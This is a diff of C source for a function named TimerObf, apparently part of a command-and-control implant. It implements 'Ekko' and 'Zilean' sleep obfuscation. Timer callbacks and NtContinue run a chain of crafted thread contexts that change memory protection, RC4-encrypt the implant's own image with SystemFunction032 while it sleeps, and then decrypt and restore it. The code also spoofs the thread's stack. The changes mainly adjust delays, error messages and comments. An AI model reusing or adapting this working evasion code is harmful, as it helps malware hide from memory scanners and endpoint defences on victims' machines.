@@ -385,18 +385,11 @@ BOOL TimerObf(
     Img.Length = Img.MaximumLength = ImgSize = IMAGE_SIZE( Instance.Session.ModuleBase );
 
     if ( Method == SLEEPOBF_EKKO ) {
-        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue ) ) ) {
-            PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
-            goto LEAVE;
-        }
+        NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
     } else if ( Method == SLEEPOBF_ZILEAN ) {
-        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
-            PRINTF( "NtCreateEvent Failed => %p\n", NtStatus )
-            goto LEAVE;
-        }
+        NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
     }
 
-    /* create our timer queue */
     if ( NT_SUCCESS( NtStatus ) )
     {
         /* create events */
@@ -406,25 +399,25 @@ BOOL TimerObf(
         {
             /* get the context of the Timer thread based on the method used */
             if ( Method == SLEEPOBF_EKKO ) {
-                NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, 0, 0, WT_EXECUTEINTIMERTHREAD );
+                NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
             } else if ( Method == SLEEPOBF_ZILEAN ) {
-                NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+                NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
             }
 
             if ( NT_SUCCESS( NtStatus ) )
             {
                 /* Send event that we got the context of the timers thread */
                 if ( Method == SLEEPOBF_EKKO ) {
-                    NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, 0, 0, WT_EXECUTEINTIMERTHREAD );
+                    NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                 } else if ( Method == SLEEPOBF_ZILEAN ) {
-                    NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
+                    NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                 }
 
                 if ( NT_SUCCESS( NtStatus ) )
                 {
                     /* wait til we successfully retrieved the timers thread context */
                     if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
-                        PRINTF( "Failed waiting for starting event: %p\n", NtStatus )
+                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                         goto LEAVE;
                     }
 
@@ -439,6 +432,7 @@ BOOL TimerObf(
 
                         /* duplicate the current thread we are going to spoof the stack */
                         if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
+                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                             goto LEAVE;
                         }
 
@@ -456,13 +450,14 @@ BOOL TimerObf(
                     ThdCtx.ContextFlags   = CONTEXT_FULL;
                     TimerCtx.ContextFlags = CONTEXT_FULL;
 
-                    /* setup structs */
+                    /* Start of Ropchain */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                     Rop[ Inc ].Rcx = U_PTR( EvntStart );
                     Rop[ Inc ].Rdx = U_PTR( INFINITE );
                     Rop[ Inc ].R8  = U_PTR( FALSE );
                     Inc++;
 
+                    /* Protect */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                     Rop[ Inc ].Rcx = U_PTR( ImgBase );
                     Rop[ Inc ].Rdx = U_PTR( ImgSize );
@@ -470,6 +465,7 @@ BOOL TimerObf(
                     Rop[ Inc ].R9  = U_PTR( &Value );
                     Inc++;
 
+                    /* Encrypt image base address */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
@@ -500,9 +496,10 @@ BOOL TimerObf(
                         Inc++;
                     }
 
+                    /* Sleep */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                     Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
-                    Rop[ Inc ].Rdx = U_PTR( TimeOut );
+                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                     Rop[ Inc ].R8  = U_PTR( FALSE );
                     Inc++;
 
@@ -520,11 +517,13 @@ BOOL TimerObf(
                         Inc++;
                     }
 
+                    /* Sys032 */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
 
+                    /* Protect */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
                     Rop[ Inc ].Rcx = U_PTR( ImgBase );
                     Rop[ Inc ].Rdx = U_PTR( ImgSize );
@@ -532,21 +531,24 @@ BOOL TimerObf(
                     Rop[ Inc ].R9  = U_PTR( &Value );
                     Inc++;
 
+                    /* End of Ropchain */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetEvent );
                     Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                     Rop[ Inc ].Rdx = U_PTR( NULL );
                     Inc++;
 
-                    PRINTF( "Rops %d to be executed\n", Inc )
+                    PRINTF( "Rops to be executed: %d\n", Inc )
 
                     /* execute/queue the timers */
                     for ( int i = 0; i < Inc; i++ ) {
                         if ( Method == SLEEPOBF_EKKO ) {
-                            if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+                                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                                 goto LEAVE;
                             }
                         } else if ( Method == SLEEPOBF_ZILEAN ) {
-                            if ( ! NT_SUCCESS( Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance.Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+                                PRINTF( "RtlRegisterWait Failed: %lx\n", NtStatus )
                                 goto LEAVE;
                             }
                         }
@@ -554,7 +556,7 @@ BOOL TimerObf(
 
                     /* just wait for the sleep to end */
                     if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
-                        PRINTF( "NtSignalAndWaitForSingleObject Failed => %p\n", NtStatus );
+                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                     } else {
                         Success = TRUE;
                     }
@@ -568,8 +570,9 @@ BOOL TimerObf(
             PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
         }
     } else {
-        PRINTF( "RtlCreateTimerQueue Failed: %lx\n", NtStatus )
+        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
     }
+
 
 
 LEAVE: /* cleanup */
